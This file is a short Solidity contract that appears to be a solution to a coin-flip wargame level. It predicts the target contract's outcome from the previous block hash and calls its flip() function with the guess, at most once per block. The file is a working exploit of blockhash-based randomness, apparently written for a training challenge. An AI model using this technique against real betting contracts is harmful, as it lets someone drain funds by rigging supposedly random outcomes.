// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

interface ICoinFlipper {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipBooster {
    using SafeMath for uint256;
    address coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

    constructor(address _coinFlip) public {
        coinFlip = _coinFlip;
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 cf = blockValue.div(FACTOR);
        bool side = cf == 1 ? true : false;

        return ICoinFlipper(coinFlip).flip(side);
    }
}
